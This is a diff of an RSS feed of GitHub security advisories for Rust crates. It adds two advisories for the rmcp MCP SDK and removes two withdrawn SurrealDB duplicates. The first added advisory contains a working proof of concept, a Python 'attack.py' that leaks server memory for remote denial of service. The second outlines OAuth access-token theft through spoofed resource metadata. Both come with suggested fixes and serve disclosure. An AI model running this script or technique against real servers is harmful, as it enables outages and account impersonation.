@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
     <title>Security Advisory for Rust crates</title>
-    <updated>2026-09-16T20:35:47.670Z</updated>
+    <updated>2026-09-16T23:22:05.257Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
     <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
@@ -11,6 +11,373 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[rmcp] RMCP: Unauthenticated permanent session-table leak in rmcp Streamable HTTP server transport leads to remote denial-of-service]]></title>
+        <id>https://github.com/advisories/GHSA-9pj6-vhgr-3mwh</id>
+        <link href="https://github.com/advisories/GHSA-9pj6-vhgr-3mwh"/>
+        <updated>2026-09-16T22:13:35.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An unauthenticated remote attacker can leak one entry per HTTP request out of the in-memory session table of <code>LocalSessionManager</code> by sending a well-formed JSON-RPC <code>POST</code> that is <em>not</em> an <code>InitializeRequest</code>. The Streamable HTTP server's <code>handle_post</code> allocates the session <strong>before</strong> it validates the body, then early-returns on the validation failure without calling <code>close_session</code>. The <code>LocalSessionHandle</code> (and the tokio mpsc channel internals it holds) is never released for the remainder of the process's lifetime — turning a ~250-byte request into a permanent ~400–550-byte server-side allocation that scales linearly with request volume and eventually exhausts memory. In the verified reproduction below, a single Python client sustains over 2 000 leak requests per second; that translates to roughly <strong>170 million leaked entries per day</strong>, equivalent to <strong>≈75 GB</strong> of resident memory just from the session table.</p>
+<h3 id="details">Details</h3>
+<p>The bug lives in <code>crates/rmcp/src/transport/streamable_http_server/tower.rs</code> inside <code>StreamableHttpService::handle_post</code>. The relevant slice of <code>1.7.0</code> source (lines <code>1126–1170</code>) is:</p>
+<pre><code class="language-rust">} else {
+    let (session_id, transport) = self
+        .session_manager
+        .create_session()                                                  // (★)
+        .await
+        .map_err(internal_error_response("create session"))?;
+    // ...capture init params if a SessionStore is configured...
+    if let ClientJsonRpcMessage::Request(req) = &amp;mut message {
+        let ClientRequest::InitializeRequest(init_req) = &amp;req.request else {
+            return Err(unexpected_message_response("initialize request")); // (A)
+        };
+        validate_header_matches_init_body(                                 // (B)
+            &amp;part.headers,
+            init_req.params.protocol_version.as_str(),
+            Some(req.id.clone()),
+        )?;
+        req.request.extensions_mut().insert(part);
+    } else {
+        return Err(unexpected_message_response("initialize request"));     // (C)
+    }
+    let service = self
+        .get_service()                                                     // (D)
+        .map_err(internal_error_response("get service"))?;
+    Self::spawn_session_worker(                                            // (★★)
+        self.session_manager.clone(),
+        session_id.clone(),
+        service,
+        transport,
+        None,
+    );
+    // ...persist to external store, send response...
+}
+</code></pre>
+<p>Two facts make this unsafe:</p>
+<ol>
+<li><code>(★)</code> inserts a <code>LocalSessionHandle</code> into <code>LocalSessionManager.sessions</code> (a <code>tokio::sync::RwLock&lt;HashMap&lt;SessionId, LocalSessionHandle&gt;&gt;</code>) and spawns a <code>LocalSessionWorker</code> task.</li>
+<li><code>(★★)</code> <code>spawn_session_worker</code> is the <strong>only</strong> code path in the entire transport (besides a client-initiated HTTP <code>DELETE</code> reaching <code>handle_delete</code>) that ever invokes <code>self.session_manager.close_session(&amp;session_id)</code>.</li>
+</ol>
+<p>Therefore the four early-returns <code>(A)</code>, <code>(B)</code>, <code>(C)</code>, and <code>(D)</code> all skip the cleanup. What happens concretely after such an early return:</p>
+<ul>
+<li>The local <code>transport: WorkerTransport&lt;LocalSessionWorker&gt;</code> goes out of scope; its <code>_drop_guard</code> cancels the worker's <code>CancellationToken</code>.</li>
+<li>The worker, which had been awaiting <code>event_rx.recv()</code>, exits within milliseconds via <code>WorkerQuitReason::Cancelled</code>. Its <code>event_rx</code> receiver is dropped.</li>
+<li><code>LocalSessionHandle.event_tx</code> (the <code>Sender</code> half of the same mpsc channel) is still alive <strong>because it is owned by the HashMap entry that nothing ever removes</strong>. The channel's <code>Inner</code> (sized to <code>channel_capacity = 16</code> by default) remains pinned in memory.</li>
+</ul>
+<p>Because the worker has already exited, the <code>SessionConfig::keep_alive</code> and <code>init_timeout</code> cleanup paths cannot run either — they only fire from inside a running worker. The leak is therefore <strong>permanent for the lifetime of the server process</strong> and grows unbounded with sustained traffic.</p>
+<p>The bug is reachable with <strong>zero authentication</strong>, the <strong>default</strong> <code>StreamableHttpServerConfig</code>, and the <strong>default</strong> <code>LocalSessionManager</code>. It is independent of the Host-header DNS-rebinding flaw fixed in 1.4.0 (GHSA-89vp-x53w-74fx / CVE-2026-42559): the attacker sends a legitimate <code>Host: &lt;bound-address&gt;</code> value and is allowed through <code>validate_dns_rebinding_headers</code> normally.</p>
+<p>A secondary side-effect amplifies the impact: every legitimate operation (session lookup, restore, new initialize) takes <code>self.sessions.write().await</code> or <code>.read().await</code> against the same <code>RwLock</code>. As the HashMap grows into the millions of phantom entries, honest clients see growing tail latency from write-lock starvation, <strong>before</strong> the box runs out of memory.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>The reproduction is fully self-contained — no clone of the rust-sdk repository is required. Create an empty directory and save the three files below into it, then run two commands.</p>
+<h4 id="step-1--server-harness">Step 1 — server harness</h4>
+<p><code>Cargo.toml</code> (paste verbatim):</p>
+<pre><code class="language-toml">[package]
+name = "rmcp_leak_repro"
+version = "0.0.1"
+edition = "2021"
+publish = false
+
+[dependencies]
+rmcp = { version = "1.7.0", default-features = false, features = [
+    "server",
+    "transport-streamable-http-server",
+] }
+tokio = { version = "1", features = ["macros", "rt-multi-thread", "signal", "sync", "time"] }
+tokio-util = { version = "0.7" }
+axum = { version = "0.8", default-features = false, features = ["http1", "tokio"] }
+anyhow = "1"
+
+[workspace]
+</code></pre>
+<p><code>src/main.rs</code> (paste verbatim):</p>
+<pre><code class="language-rust">//! Minimal MCP Streamable HTTP server that prints the size of the
+//! LocalSessionManager.sessions HashMap once a second so the leak is
+//! observable from stdout.
+
+use std::sync::Arc;
+
+use rmcp::{
+    ErrorData, RoleServer, ServerHandler,
+    model::{Implementation, InitializeRequestParams, InitializeResult, ServerCapabilities},
+    service::RequestContext,
+    transport::{
+        StreamableHttpServerConfig, StreamableHttpService,
+        streamable_http_server::session::local::LocalSessionManager,
+    },
+};
+
+const BIND_ADDRESS: &amp;str = "127.0.0.1:8000";
+
+#[derive(Clone, Default)]
+struct MinimalServer;
+
+impl ServerHandler for MinimalServer {
+    async fn initialize(
+        &amp;self,
+        _request: InitializeRequestParams,
+        _cx: RequestContext&lt;RoleServer&gt;,
+    ) -&gt; Result&lt;InitializeResult, ErrorData&gt; {
+        Ok(InitializeResult::new(ServerCapabilities::builder().build())
+            .with_server_info(Implementation::new("rmcp-leak-repro", "0.0.1")))
+    }
+}
+
+#[tokio::main]
+async fn main() -&gt; anyhow::Result&lt;()&gt; {
+    let ct = tokio_util::sync::CancellationToken::new();
+    let manager: Arc&lt;LocalSessionManager&gt; = Arc::new(LocalSessionManager::default());
+
+    // Reporter — prints sessions.len() every second.
+    {
+        let manager = manager.clone();
+        let ct = ct.clone();
+        tokio::spawn(async move {
+            loop {
+                tokio::select! {
+                    _ = ct.cancelled() =&gt; break,
+                    _ = tokio::time::sleep(std::time::Duration::from_secs(1)) =&gt; {
+                        let n = manager.sessions.read().await.len();
+                        println!("[count] active_sessions={n}");
+                    }
+                }
+            }
+        });
+    }
+
+    let service = StreamableHttpService::new(
+        || Ok(MinimalServer::default()),
+        manager.clone(),
+        StreamableHttpServerConfig::default().with_cancellation_token(ct.child_token()),
+    );
+
+    let router = axum::Router::new().nest_service("/mcp", service);
+    let tcp_listener = tokio::net::TcpListener::bind(BIND_ADDRESS).await?;
+    println!("[server] listening on http://{BIND_ADDRESS}/mcp");
+
+    let _ = axum::serve(tcp_listener, router)
+        .with_graceful_shutdown(async move {
+            tokio::signal::ctrl_c().await.ok();
+            ct.cancel();
+        })
+        .await;
+    Ok(())
+}
+</code></pre>
+<p>Start it:</p>
+<pre><code class="language-bash">cargo run --release
+</code></pre>
+<p>Initial output:</p>
+<pre><code>[server] listening on http://127.0.0.1:8000/mcp
+[count] active_sessions=0
+[count] active_sessions=0
+[count] active_sessions=0
+</code></pre>
+<h4 id="step-2--attacker">Step 2 — attacker</h4>
+<p><code>attack.py</code> (paste verbatim — Python 3 standard library only, no <code>pip install</code> required):</p>
+<pre><code class="language-python">import http.client, json, sys, time
+
+HOST, PORT, PATH = "127.0.0.1", 8000, "/mcp"
+
+# A `CustomRequest` -- valid JSON-RPC, valid `ClientJsonRpcMessage::Request`,
+# but NOT an `InitializeRequest`. The server's `let ... else` pattern at
+# tower.rs:1148 rejects it after the session has already been created
+# at tower.rs:1129.
+body = json.dumps({
+    "jsonrpc": "2.0",
+    "id": 1,
+    "method": "tools/list",
+    "params": {},
+}).encode("ascii")
+
+headers = {
+    "Host": f"{HOST}:{PORT}",                        # passes allowed_hosts
+    "Content-Type": "application/json",
+    "Accept": "application/json, text/event-stream",
+    "Content-Length": str(len(body)),
+}
+
+n = int(sys.argv[1]) if len(sys.argv) &gt; 1 else 1000
+print(f"[client] firing {n} leaking POSTs at http://{HOST}:{PORT}{PATH}")
+start = time.monotonic()
+leaked = 0
+for i in range(n):
+    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
+    conn.request("POST", PATH, body=body, headers=headers)
+    resp = conn.getresponse()
+    status = resp.status
+    resp.read()
+    conn.close()
+    if status == 422:
+        leaked += 1
+elapsed = time.monotonic() - start
+print(f"[client] done in {elapsed:.2f}s. {leaked}/{n} requests took the leaking branch (HTTP 422).")
+</code></pre>
+<p>Run it:</p>
+<pre><code class="language-bash">python3 attack.py 1000
+</code></pre>
+<h4 id="step-3--observed-evidence">Step 3 — observed evidence</h4>
+<p>Attacker output (verbatim, measured on Rust 1.92.0 stable, macOS):</p>
+<pre><code>[client] firing 1000 leaking POSTs at http://127.0.0.1:8000/mcp
+[client] done in 0.46s. 1000/1000 requests took the leaking branch (HTTP 422).
+</code></pre>
+<p>Server output during and after the attack:</p>
+<pre><code>[count] active_sessions=0
+[count] active_sessions=0
+[count] active_sessions=0
+[count] active_sessions=844
+[count] active_sessions=1000      &lt;-- attack complete, attacker has disconnected
+[count] active_sessions=1000
+[count] active_sessions=1000
+[count] active_sessions=1000
+[count] active_sessions=1000      &lt;-- 20+ seconds later, still 1000
+[count] active_sessions=1000
+[count] active_sessions=1000
+</code></pre>
+<p>The behavioural evidence that confirms the vulnerability:</p>
+<ul>
+<li>Every one of the 1 000 requests took the leak branch (<code>HTTP 422 Unprocessable Entity</code> with body <code>Unexpected message, expect initialize request</code>).</li>
+<li>A single Python client sustained <code>1000 / 0.46 ≈ 2 174</code> leak requests per second.</li>
+<li>After the attacker exited, <code>active_sessions=1000</code> never decreased. The session table holds those entries for the rest of the process's lifetime.</li>
+</ul>
+
+
+<img width="3554" height="1468" alt="poc" src="https://github.com/user-attachments/assets/48e51c27-c0b9-4bf9-ab3f-d56193ac6da6">
+
+
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Attack vector</strong>: Network (AV:N). The listener binds a TCP port; the default <code>allowed_hosts = ["localhost", "127.0.0.1", "::1"]</code> accepts anything reaching it over the loopback interface. In the dominant deployment model — a Streamable HTTP MCP server embedded into an IDE or local agent — any co-resident process on the host is a candidate attacker. In LAN deployments where the operator widened <code>allowed_hosts</code> to a public hostname, the attack is reachable from the network.</li>
+<li><strong>Authentication required</strong>: None.</li>
+<li><strong>User interaction required</strong>: None.</li>
+<li><strong>Result</strong>: Denial of Service. Memory grows linearly with attacker request volume (~400–550 bytes per leaked entry, including the <code>SessionId</code> <code>Arc&lt;str&gt;</code>, the <code>LocalSessionHandle</code> struct, and the half-dropped mpsc channel <code>Inner</code>). At the measured rate of 2 174 leak requests per second from one Python client:<ul>
+<li><strong>1 hour</strong>: ~7.8 M entries, ≈3.5 GB</li>
+<li><strong>1 day</strong>: ~187 M entries, ≈84 GB</li>
+<li><strong>1 week</strong>: process is long dead from OOM</li>
+</ul>
+</li>
+<li><strong>Secondary effect</strong>: <code>LocalSessionManager.sessions</code> is behind a <code>tokio::sync::RwLock</code>. Every legitimate session operation (<code>has_session</code>, <code>create_session</code>, <code>close_session</code>, <code>restore_session</code>) takes that lock. As the HashMap grows, write-lock contention degrades latency for all clients well before OOM.</li>
+<li><strong>Worst case</strong>: Server process is OOM-killed and any in-flight sessions are torn down with it. Restart restores service but does not prevent re-attack.</li>
+</ul>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Two minimally invasive options. Both have been considered against the existing API; the maintainers will know which fits better with the internal contracts.</p>
+<ol>
+<li><strong>Validate before allocating.</strong> Move the <code>ClientJsonRpcMessage::Request(InitializeRequest)</code> discriminant check and the <code>validate_header_matches_init_body</code> call <strong>above</strong> the <code>self.session_manager.create_session().await</code> line. Reject non-initialize bodies with <code>422</code> <em>before</em> any state is created. This removes a class of bugs rather than patching one path. The downside is that <code>validate_header_matches_init_body</code> currently reads <code>init_req.params.protocol_version</code>, so the <code>InitializeRequest</code> discriminant has to be deconstructed earlier — a small refactor.</li>
+<li><strong>RAII guard for the session.</strong> Wrap the <code>session_id</code> returned by <code>create_session</code> in a guard whose <code>Drop</code> impl spawns a <code>close_session</code> call. Demote the guard to a no-op only after the handshake has fully succeeded (i.e. at the very end of the happy-path arm, just before the response is returned). This keeps the existing flow but converts every early-return into a cleanup trigger automatically — including future early-returns that reviewers might miss.</li>
+</ol>
+<p>A regression test that asserts <code>session_manager.sessions.read().await.len() == 0</code> after sending a non-initialize POST and a header-mismatched initialize POST would catch this and any similar future regressions.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/modelcontextprotocol/rust-sdk/security/advisories/GHSA-9pj6-vhgr-3mwh">https://github.com/modelcontextprotocol/rust-sdk/security/advisories/GHSA-9pj6-vhgr-3mwh</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63128">https://nvd.nist.gov/vuln/detail/CVE-2026-63128</a></li>
+<li><a href="https://github.com/modelcontextprotocol/rust-sdk/pull/934">https://github.com/modelcontextprotocol/rust-sdk/pull/934</a></li>
+<li><a href="https://github.com/modelcontextprotocol/rust-sdk/commit/dfa7fd6f9309deab60bea230b041be9a3fcda846">https://github.com/modelcontextprotocol/rust-sdk/commit/dfa7fd6f9309deab60bea230b041be9a3fcda846</a></li>
+<li><a href="https://github.com/modelcontextprotocol/rust-sdk/releases/tag/rmcp-v2.0.0">https://github.com/modelcontextprotocol/rust-sdk/releases/tag/rmcp-v2.0.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-9pj6-vhgr-3mwh">https://github.com/advisories/GHSA-9pj6-vhgr-3mwh</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9pj6-vhgr-3mwh</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-16T22:13:34.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rmcp] RMCP: Missing Resource Field Validation in OAuth Protected Resource Metadata Discovery]]></title>
+        <id>https://github.com/advisories/GHSA-33f5-2c5q-wgwj</id>
+        <link href="https://github.com/advisories/GHSA-33f5-2c5q-wgwj"/>
+        <updated>2026-09-16T22:13:27.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The <code>rmcp</code> library does not validate the <code>resource</code> parameter in OAuth Protected Resource metadata (RFC 9728), allowing a malicious MCP server to redirect OAuth flows to a legitimate authorization server and steal the resulting access tokens.</p>
+<h3 id="details">Details</h3>
+<p>RFC 9728 specifies two MUST requirements for resource parameter validation:</p>
+<ul>
+<li>Section 7.3: the client MUST ensure that the resource identifier URL it is using as the prefix for the metadata request exactly matches the <code>resource</code> value in the returned metadata document.</li>
+<li>Section 3.3: if the <code>resource</code> value returned is not identical to the URL the client used, the data MUST NOT be used.</li>
+</ul>
+<p>In the current implementation (<code>crates/rmcp/src/transport/auth.rs</code>), the <code>ResourceServerMetadata</code> struct (lines 390–394) does not include a resource field:</p>
+<pre><code class="language-rust">struct ResourceServerMetadata {
+    authorization_server: Option&lt;String&gt;,
+    authorization_servers: Option&lt;Vec&lt;String&gt;&gt;,
+    scopes_supported: Option&lt;Vec&lt;String&gt;&gt;,
+}
+</code></pre>
+<p>And discover_oauth_server_via_resource_metadata() (lines 1446–1465) proceeds without any resource URL validation.</p>
+<h4 id="recommended-fix">Recommended fix</h4>
+<ol>
+<li>Add the <code>resource</code> field to the struct:<pre><code class="language-rust">struct ResourceServerMetadata {
+    resource: Option&lt;String&gt;,  // RFC 9728 REQUIRED field
+    authorization_server: Option&lt;String&gt;,
+    authorization_servers: Option&lt;Vec&lt;String&gt;&gt;,
+    scopes_supported: Option&lt;Vec&lt;String&gt;&gt;,
+}
+</code></pre>
+</li>
+<li>Add validation logic after fetching metadata:<pre><code class="language-rust">let Some(resource_metadata) = self
+    .fetch_resource_metadata_from_url(&amp;resource_metadata_url)
+    .await?
+else {
+    return Ok(None);
+};
+
+// RFC 9728: validate that the resource identifier matches our target server
+if let Some(resource) = &amp;resource_metadata.resource {
+    if resource.trim_end_matches('/') != self.base_url.as_str().trim_end_matches('/') {
+        return Err(AuthError::MetadataError(format!(
+            "Resource metadata mismatch: expected '{}', got '{}'",
+            self.base_url, resource
+        )));
+    }
+}
+</code></pre>
+</li>
+</ol>
+<h3 id="poc">PoC</h3>
+<ol>
+<li><p>Attacker sets up a malicious MCP server at <code>fake-mcp.com/mcp</code>. </p>
+</li>
+<li><p>At <code>fake-mcp.com/mcp/.well-known/oauth-protected-resource</code>, the attacker serves metadata declaring:</p>
+<ul>
+<li>resource: <code>real-mcp.com/mcp</code> (the legitimate server)</li>
+<li>authorization_servers: the legitimate authorization server(s) of <code>real-mcp.com/mcp</code></li>
+</ul>
+</li>
+<li><p>Victim configures any MCP client using <code>rmcp</code> to connect to <code>fake-mcp.com/mcp</code>.</p>
+</li>
+<li><p><code>rmcp</code> fetches the protected resource metadata and, without validating that the <code>resource</code> field (<code>real-mcp.com/mcp</code>) differs from the configured server (<code>fake-mcp.com/mcp</code>), initiates an OAuth flow with the legitimate authorization server.</p>
+</li>
+<li><p>The victim sees a legitimate authorization prompt and completes the flow.</p>
+</li>
+<li><p>The resulting access token — valid for <code>real-mcp.com/mcp</code> — is sent to <code>fake-mcp.com/mcp</code> in subsequent requests.</p>
+</li>
+<li><p>The attacker captures the token and can impersonate the victim on <code>real-mcp.com/mcp</code>.</p>
+</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>This is an access token theft vulnerability via OAuth resource metadata spoofing. All MCP clients built on <code>rmcp</code> that rely on OAuth-protected MCP servers are affected. An attacker who tricks a user into connecting to a malicious MCP server can steal valid access tokens for any legitimate MCP server, enabling full impersonation of the victim.</p>
+<h4 id="credit">Credit</h4>
+<p>Jian Cui, Minsun Shim, Zhou Li, Xiaojing Liao
+University of Illinois Urbana-Champaign (UIUC)
+University of California, Irvine (UCI)</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/modelcontextprotocol/rust-sdk/security/advisories/GHSA-33f5-2c5q-wgwj">https://github.com/modelcontextprotocol/rust-sdk/security/advisories/GHSA-33f5-2c5q-wgwj</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63127">https://nvd.nist.gov/vuln/detail/CVE-2026-63127</a></li>
+<li><a href="https://github.com/modelcontextprotocol/rust-sdk/pull/937">https://github.com/modelcontextprotocol/rust-sdk/pull/937</a></li>
+<li><a href="https://github.com/modelcontextprotocol/rust-sdk/commit/c1a8b29ff2cc45e7820b900dae42cbb4958089ec">https://github.com/modelcontextprotocol/rust-sdk/commit/c1a8b29ff2cc45e7820b900dae42cbb4958089ec</a></li>
+<li><a href="https://github.com/modelcontextprotocol/rust-sdk/releases/tag/rmcp-v2.0.0">https://github.com/modelcontextprotocol/rust-sdk/releases/tag/rmcp-v2.0.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-33f5-2c5q-wgwj">https://github.com/advisories/GHSA-33f5-2c5q-wgwj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-33f5-2c5q-wgwj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-16T22:13:26.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[libp2p-quic] libp2p-quic: Remote panic via certificate expiry race during QUIC handshake]]></title>
         <id>https://github.com/advisories/GHSA-5hq8-qhww-jm7q</id>
@@ -1087,55 +1454,5 @@ the script element boundary.</p>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-07-20T12:33:08.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[surrealdb] Duplicate Advisory: SurrealDB: Array element-level (field.*) SELECT permissions leak denied elements to record users]]></title>
-        <id>https://github.com/advisories/GHSA-j6mj-v752-pp4x</id>
-        <link href="https://github.com/advisories/GHSA-j6mj-v752-pp4x"/>
-        <updated>2026-09-04T19:48:30.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-8rw6-p7m8-63jp. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>SurrealDB versions before 3.1.4 fail to properly enforce SELECT permissions on array elements (field.*) for record users, leaking denied array elements instead of hiding them. Attackers with record scope access can read array elements that element-level permissions should deny by exploiting incorrect index handling during permission filtering.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-8rw6-p7m8-63jp">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-8rw6-p7m8-63jp</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63740">https://nvd.nist.gov/vuln/detail/CVE-2026-63740</a></li>
-<li><a href="https://www.vulncheck.com/advisories/surrealdb-before-array-element-permission-bypass">https://www.vulncheck.com/advisories/surrealdb-before-array-element-permission-bypass</a></li>
-<li><a href="https://github.com/advisories/GHSA-j6mj-v752-pp4x">https://github.com/advisories/GHSA-j6mj-v752-pp4x</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-j6mj-v752-pp4x</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-20T12:33:08.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[surrealdb] Duplicate Advisory: Uncaught Exception processing HTTP Headers in SurrealDB]]></title>
-        <id>https://github.com/advisories/GHSA-f7q6-7rq9-3phx</id>
-        <link href="https://github.com/advisories/GHSA-f7q6-7rq9-3phx"/>
-        <updated>2026-09-04T19:39:24.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-m24x-r6q3-2vp9. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>SurrealDB versions before 1.1.0 fail to properly parse the ID, DB, and NS headers in HTTP REST API requests containing special characters. Unauthenticated attackers can send crafted HTTP requests with malformed header values to trigger an uncaught exception that crashes the server.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-m24x-r6q3-2vp9">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-m24x-r6q3-2vp9</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-58368">https://nvd.nist.gov/vuln/detail/CVE-2024-58368</a></li>
-<li><a href="https://www.vulncheck.com/advisories/surrealdb-before-denial-of-service-via-http-headers">https://www.vulncheck.com/advisories/surrealdb-before-denial-of-service-via-http-headers</a></li>
-<li><a href="https://github.com/advisories/GHSA-f7q6-7rq9-3phx">https://github.com/advisories/GHSA-f7q6-7rq9-3phx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f7q6-7rq9-3phx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-18T15:31:49.000Z</published>
     </entry>
 </feed>
